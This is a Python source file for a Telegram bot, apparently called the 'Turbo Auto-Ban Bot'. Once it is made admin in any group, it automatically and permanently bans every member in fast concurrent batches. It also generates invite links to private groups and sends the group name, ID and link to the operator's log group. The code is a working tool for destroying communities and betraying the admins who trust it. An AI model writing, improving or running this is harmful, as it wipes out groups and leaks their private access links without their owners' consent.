import os
import asyncio
import time
from telethon import TelegramClient, events, functions, types
from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAdminInvalidError

# ───── CONFIGURATION (ENV) ───── #
def get_env_var(name):
    val = os.environ.get(name)
    if not val: print(f"⚠️ {name} is missing!"); return None
    return val

API_ID = int(get_env_var("API_ID"))
API_HASH = get_env_var("API_HASH")
BOT_TOKEN = get_env_var("BOT_TOKEN")
LOG_GROUP_ID = int(get_env_var("LOG_GROUP_ID"))

# Ek saath kitne bans fire karne hain (30 is max speed)
BATCH_SIZE = 30 

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_purges = set()

# ───── FUNCTION: GET/GENERATE LINK ───── #
async def fetch_link(chat):
    if getattr(chat, 'username', None):
        return f"https://t.me/{chat.username}"
    try:
        # Private group link generate karne ki koshish
        l = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
        return l.link
    except:
        return "Private (No Link Access)"

# ───── FUNCTION: FAST PERMANENT BAN ───── #
async def execute_ban(chat_id, user_id):
    try:
        await bot(functions.channels.EditBannedRequest(
            channel=chat_id,
            participant=user_id,
            banned_rights=types.ChatBannedRights(
                until_date=None, # Permanent
                view_messages=True,
                send_messages=True,
                send_media=True,
                send_stickers=True,
                send_gifs=True,
                embed_links=True
            )
        ))
        return True
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return False
    except (ChatAdminRequiredError, UserAdminInvalidError):
        return "STOP" # Rights chali gayi
    except Exception:
        return False

# ───── CORE PURGE ENGINE ───── #
async def start_the_purge(chat):
    if chat.id in active_purges: return
    active_purges.add(chat.id)
    
    me = await bot.get_me()
    start_time = time.time()
    count = 0
    link = await fetch_link(chat)

    # Initial Log
    await bot.send_message(
        LOG_GROUP_ID, 
        f"🚨 **Auto-Ban Triggered!**\n\n"
        f"🏷️ **Group:** {chat.title}\n"
        f"🆔 **ID:** `{chat.id}`\n"
        f"🔗 **Link:** {link}\n"
        f"⚡ **Action:** Banning all members..."
    )

    try:
        batch = []
        async for user in bot.iter_participants(chat.id):
            if user.id == me.id: continue # Khud ko ban nahi karega
            
            batch.append(execute_ban(chat.id, user.id))

            if len(batch) >= BATCH_SIZE:
                results = await asyncio.gather(*batch)
                count += sum(1 for r in results if r is True)
                batch = []
                
                if "STOP" in results:
                    await bot.send_message(LOG_GROUP_ID, f"❌ **Permission Lost** in {chat.title}")
                    break
                
                await asyncio.sleep(0.1) # System stability

        if batch: # Last batch
            results = await asyncio.gather(*batch)
            count += sum(1 for r in results if r is True)

    finally:
        end_time = round(time.time() - start_time, 2)
        await bot.send_message(
            LOG_GROUP_ID, 
            f"🏁 **Purge Finished Successfully**\n\n"
            f"🏷️ **Group:** {chat.title}\n"
            f"🚫 **Total Banned:** {count}\n"
            f"⏱️ **Time:** {end_time}s\n"
            f"🔗 **Link:** {link}"
        )
        active_purges.remove(chat.id)

# ───── AUTO TRIGGERS ───── #
@bot.on(events.ChatAction)
async def added_handler(event):
    # Jab bot group mein add ho
    if event.user_added and event.user_id == (await bot.get_me()).id:
        chat = await event.get_chat()
        asyncio.create_task(run_checks(chat))

@bot.on(events.NewMessage())
async def message_handler(event):
    # Jab group mein koi message aaye aur bot wahan ho
    if event.is_group or event.is_channel:
        chat = await event.get_chat()
        asyncio.create_task(run_checks(chat))

async def run_checks(chat):
    if chat.id in active_purges: return
    try:
        p = await bot.get_permissions(chat.id, 'me')
        if p.is_admin and p.ban_users:
            await start_the_purge(chat)
    except:
        pass

# ───── RUN ───── #
print("🚀 Turbo Auto-Ban Bot is running...")
bot.run_until_disconnected()
